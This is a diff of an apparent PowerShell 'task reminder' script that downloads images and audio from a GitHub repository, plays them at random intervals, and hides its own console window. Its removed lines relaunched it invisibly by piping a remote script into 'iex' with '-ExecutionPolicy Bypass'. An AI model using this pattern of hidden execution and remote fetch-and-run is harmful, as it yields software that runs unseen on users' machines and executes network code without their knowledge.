@@ -1,6 +1,5 @@
 # ================= CONFIG =================
-$BaseUrl   = "https://raw.githubusercontent.com/Kiyan-7/telaviv/main"
-$ScriptUrl = "$BaseUrl/reminders.ps1"
+$BaseUrl = "https://raw.githubusercontent.com/Kiyan-7/telaviv/main"
 
 $Sites = @{
     1 = "https://heavensgate.com/"
@@ -14,7 +13,7 @@ $MinSeconds  = 10
 $MaxSeconds  = 120
 $Volume      = 0.5
 $AvoidRepeat = $true
-$ShowConsole = $false
+$ShowConsole = $false   # set to $true when debugging (keeps the window visible)
 # ==========================================
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
@@ -27,20 +26,28 @@ function Log($m) {
     if ($ShowConsole) { Write-Host $m }
 }
 
-# ---- Relaunch with no console window at all (CREATE_NO_WINDOW) ----
-if (-not $ShowConsole -and -not $env:TR_CHILD) {
+# ---- Hide the terminal window hosting this script ----
+# (hiding keeps the program running; closing the window would end it)
+if (-not $ShowConsole) {
     try {
-        $psi = New-Object System.Diagnostics.ProcessStartInfo
-        $psi.FileName        = Join-Path $PSHOME "powershell.exe"
-        $psi.Arguments       = '-NoProfile -ExecutionPolicy Bypass -Command "$env:TR_CHILD=1; irm ' + $ScriptUrl + ' | iex"'
-        $psi.UseShellExecute = $false
-        $psi.CreateNoWindow  = $true
-        $p = [System.Diagnostics.Process]::Start($psi)
-        Log "Launcher: started windowless child (PID $($p.Id)), launcher exiting"
-        exit
-    } catch {
-        Log "Launcher: relaunch failed ($($_.Exception.Message)), running in this window instead"
-    }
+        Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+public class WinHide {
+    [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
+    [DllImport("user32.dll")]   public static extern IntPtr GetAncestor(IntPtr hWnd, uint flags);
+    [DllImport("user32.dll")]   public static extern bool ShowWindow(IntPtr hWnd, int cmd);
+}
+"@ -ErrorAction Stop
+        $c = [WinHide]::GetConsoleWindow()
+        if ($c -ne [IntPtr]::Zero) {
+            $root = [WinHide]::GetAncestor($c, 3)    # GA_ROOTOWNER = the visible terminal window
+            if ($root -eq [IntPtr]::Zero) { $root = $c }
+            [void][WinHide]::ShowWindow($root, 0)
+            if ($root -ne $c) { [void][WinHide]::ShowWindow($c, 0) }
+            Log "Window hidden"
+        } else { Log "No console window found to hide" }
+    } catch { Log "HIDE FAILED: $($_.Exception.Message)" }
 }
 
 Log "--- started. Language mode: $($ExecutionContext.SessionState.LanguageMode), PS $($PSVersionTable.PSVersion), apartment: $([Threading.Thread]::CurrentThread.GetApartmentState())"
@@ -50,15 +57,20 @@ $mutex = New-Object System.Threading.Mutex($false, "Local\TaskReminderLoop")
 if (-not $mutex.WaitOne(0)) { Log "Already running, exiting."; exit }
 $PID | Out-File (Join-Path $Dir "pid.txt")
 
-# Download assets
+# Download assets (always refreshed so old cached copies never linger)
 foreach ($i in 1..5) {
     foreach ($f in "image$i.jpg", "audio$i.wav") {
         $dest = Join-Path $Dir $f
-        if (-not (Test-Path $dest)) {
-            try {
-                Invoke-WebRequest -UseBasicParsing "$BaseUrl/$f" -OutFile $dest -ErrorAction Stop
-                Log "Downloaded $f"
-            } catch { Log "DOWNLOAD FAILED $BaseUrl/$f : $($_.Exception.Message)" }
+        $tmp  = "$dest.tmp"
+        try {
+            Invoke-WebRequest -UseBasicParsing "$BaseUrl/$f" -OutFile $tmp -ErrorAction Stop
+            $len = (Get-Item $tmp).Length
+            if ($len -lt 1000) { throw "file is only $len bytes (not a real file?)" }
+            Move-Item $tmp $dest -Force
+            Log "Downloaded $f ($len bytes)"
+        } catch {
+            Log "DOWNLOAD FAILED $BaseUrl/$f : $($_.Exception.Message)"
+            Remove-Item $tmp -Force -ErrorAction SilentlyContinue
         }
     }
 }
@@ -102,9 +114,26 @@ while ($true) {
 
     if ($player) {
         try {
-            $player.Open([Uri](Join-Path $Dir "audio$x.wav"))
+            $file = Join-Path $Dir "audio$x.wav"
+            $player.Stop()
+            $player.Close()
+            $player = New-Object System.Windows.Media.MediaPlayer
+            $player.Open([Uri]$file)
             $player.Volume = $Volume
-            $player.Play()
+
+            # wait up to 3s for the file to finish loading
+            $t = 0
+            while (-not $player.NaturalDuration.HasTimeSpan -and $t -lt 30) {
+                Start-Sleep -Milliseconds 100
+                $t++
+            }
+
+            if ($player.NaturalDuration.HasTimeSpan) {
+                $player.Play()
+                Log "Playing audio$x.wav ($([int]$player.NaturalDuration.TimeSpan.TotalSeconds)s)"
+            } else {
+                Log "AUDIO FAILED to load $file ($((Get-Item $file -ErrorAction SilentlyContinue).Length) bytes)"
+            }
         } catch { Log "AUDIO FAILED: $($_.Exception.Message)" }
     }
 
